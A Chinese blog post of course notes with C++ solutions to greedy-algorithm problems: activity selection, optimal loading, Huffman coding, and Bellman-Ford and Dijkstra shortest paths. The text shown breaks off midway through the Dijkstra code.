    <url>/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="活动安排问题"><a href="#活动安排问题" class="headerlink" title="活动安排问题"></a>活动安排问题</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/act1.png"></p>
<p><img src="/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/act2.png"></p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">greedySelector</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> intervals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> intervals<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 将活动区间按结束时间的从小到大排序</span>
    <span class="token keyword">auto</span> cmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> interval1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> interval2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> interval1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> interval2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">sort</span><span class="token punctuation">(</span>intervals<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> intervals<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">res</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 结束时间最早的活动必定位于某个最优解之中</span>
    <span class="token keyword">int</span> minStart <span class="token operator">=</span> intervals<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>=</span> minStart<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 将不重叠的活动加入最优解集</span>
            res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            minStart <span class="token operator">=</span> intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="最优装载"><a href="#最优装载" class="headerlink" title="最优装载"></a>最优装载</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/load.png"></p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">optimisedLoading</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> weight<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> weight<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">select</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 定义一个小顶优先队列，使得对于i，若其weight[i]最小，则排在队列的队头</span>
	priority_queue<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token punctuation">,</span> greater<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span> q<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// 构建二元组&lt;重量,下标>并放入优先队列</span>
		q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>weight<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">auto</span> <span class="token punctuation">[</span>w<span class="token punctuation">,</span> idx<span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// （C++17语法）取队头元素的w和对应下标</span>
		q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">&lt;</span> w<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// 无法继续装载</span>
		select<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 选择装载该货物</span>
		c <span class="token operator">-=</span> w<span class="token punctuation">;</span> <span class="token comment">// 剩余载货量减少</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> select<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/huffman1.png"></p>
<p><img src="/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/huffman2.png"></p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">HuffmanNode</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> left<span class="token punctuation">,</span> right<span class="token punctuation">;</span> <span class="token comment">// 左右结点</span>
	<span class="token keyword">int</span> parent<span class="token punctuation">;</span> <span class="token comment">// 父结点</span>
	<span class="token keyword">int</span> weight<span class="token punctuation">;</span> <span class="token comment">// 权重</span>
	<span class="token keyword">char</span> data<span class="token punctuation">;</span> <span class="token comment">// 数据</span>
	<span class="token function">HuffmanNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">int</span> parent <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">int</span> weight <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">char</span> data <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
		<span class="token operator">:</span> <span class="token function">left</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">right</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">parent</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">weight</span><span class="token punctuation">(</span>weight<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">data</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

vector<span class="token operator">&lt;</span>HuffmanNode<span class="token operator">></span> <span class="token function">createHuffmanTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> weight<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">&amp;</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> weight<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span>HuffmanNode<span class="token operator">></span> <span class="token function">huffmanTree</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 定义一个小顶优先队列，使得对于i，若其weight[i]最小，则排在队列的队头</span>
	priority_queue<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token punctuation">,</span> greater<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span> q<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 初始化哈夫曼树和优先队列</span>
		huffmanTree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		huffmanTree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">=</span> weight<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>weight<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">auto</span> <span class="token punctuation">[</span>weight1<span class="token punctuation">,</span> idx1<span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取权值最小结点</span>
		q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">auto</span> <span class="token punctuation">[</span>weight2<span class="token punctuation">,</span> idx2<span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取权值第二小结点</span>
		q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 创建两结点的父结点，其下标为n+i</span>
		huffmanTree<span class="token punctuation">[</span>idx1<span class="token punctuation">]</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> n <span class="token operator">+</span> i<span class="token punctuation">;</span>
		huffmanTree<span class="token punctuation">[</span>idx2<span class="token punctuation">]</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> n <span class="token operator">+</span> i<span class="token punctuation">;</span>
		<span class="token comment">// 初始化该父结点的相关信息</span>
		huffmanTree<span class="token punctuation">[</span>n <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">.</span>left <span class="token operator">=</span> idx1<span class="token punctuation">;</span>
		huffmanTree<span class="token punctuation">[</span>n <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">.</span>right <span class="token operator">=</span> idx2<span class="token punctuation">;</span>
		huffmanTree<span class="token punctuation">[</span>n <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">=</span> weight1 <span class="token operator">+</span> weight2<span class="token punctuation">;</span>
		<span class="token comment">// 将该父结点的&lt;权值,下标>加入优先队列，以便进行贪心选择</span>
		q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>weight1 <span class="token operator">+</span> weight2<span class="token punctuation">,</span> n <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> huffmanTree<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">printHuffmanCode</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>HuffmanNode<span class="token operator">></span><span class="token operator">&amp;</span> huffmanTree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> s<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> huffmanTree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> cur <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// 当前结点下标</span>
		<span class="token keyword">int</span> pre <span class="token operator">=</span> huffmanTree<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">.</span>parent<span class="token punctuation">;</span> <span class="token comment">// 当前结点的父结点的下标</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>pre <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>huffmanTree<span class="token punctuation">[</span>pre<span class="token punctuation">]</span><span class="token punctuation">.</span>left <span class="token operator">==</span> cur<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 当前结点为其父结点的左孩子</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
				s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 当前结点为其父结点的右孩子</span>
			<span class="token punctuation">&#125;</span>
			<span class="token comment">// 轮换下标</span>
			cur <span class="token operator">=</span> pre<span class="token punctuation">;</span>
			pre <span class="token operator">=</span> huffmanTree<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">.</span>parent<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token comment">// 打印相应的哈夫曼编码</span>
		cout <span class="token operator">&lt;&lt;</span> huffmanTree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="单源最短路径"><a href="#单源最短路径" class="headerlink" title="单源最短路径"></a>单源最短路径</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/mindis.png"></p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">MGraph</span> <span class="token punctuation">&#123;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span> <span class="token comment">// 顶点数组</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span> <span class="token comment">// 邻接矩阵</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h3 id="BellmanFord"><a href="#BellmanFord" class="headerlink" title="BellmanFord"></a>BellmanFord</h3><p>此算法可适用于含有负权值边的图。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// G:图	start:源点	dist:最短路径</span>
<span class="token keyword">bool</span> <span class="token function">BellmanFord</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> dist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 初始化最短路径</span>
	dist<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> INT32_MAX<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> t <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 松弛次数t</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 边的起点i</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 边的终点j</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX <span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX
					<span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 松弛操作</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token comment">// 若执行完算法后仍然存在非最短路径，则该图存在权值为负的环路，无最短路径</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX <span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX
				<span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Dijkstra"><a href="#Dijkstra" class="headerlink" title="Dijkstra"></a>Dijkstra</h3><p>本算法仅适用于所有边的权值均为正的图。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// G:图	start:源点	dist:最短路径</span>
<span class="token keyword">void</span> <span class="token function">Dijkstra</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> dist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 初始化最短路径</span>
	dist<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> INT32_MAX<span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">pre</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 前驱数组</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 访问集，表示对应顶点最短路径是否已经找到</span>
	visited<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token comment">// 小顶优先队列，元素为&lt;dist[j],j></span>
